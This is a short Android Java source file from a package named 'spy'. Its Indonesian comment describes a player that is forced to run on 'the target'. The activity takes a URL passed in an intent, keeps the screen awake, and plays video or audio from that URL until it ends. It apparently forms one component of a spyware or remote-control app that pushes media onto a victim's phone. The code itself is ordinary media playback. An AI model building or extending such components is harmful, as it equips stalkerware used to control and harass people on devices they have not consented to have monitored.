package ai.m4zk1play.spy;

import android.app.Activity;
import android.media.MediaPlayer;
import android.net.Uri;
import android.os.Bundle;
import android.view.View;
import android.view.WindowManager;
import android.widget.VideoView;

/** Pemutar audio/video yang dipaksa jalan di target. */
public class PlayerActivity extends Activity {

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        String url = getIntent().getStringExtra("url");
        String kind = getIntent().getStringExtra("kind");
        if (url == null) { finish(); return; }

        if ("video".equals(kind)) {
            VideoView v = new VideoView(this);
            v.setVideoURI(Uri.parse(url));
            v.setOnCompletionListener(mp -> finish());
            v.start();
            setContentView(v);
        } else {
            try {
                MediaPlayer mp = MediaPlayer.create(this, Uri.parse(url));
                if (mp != null) {
                    mp.setOnCompletionListener(m -> finish());
                    mp.start();
                }
            } catch (Exception ignored) { }
            setContentView(new View(this));
        }
    }
}
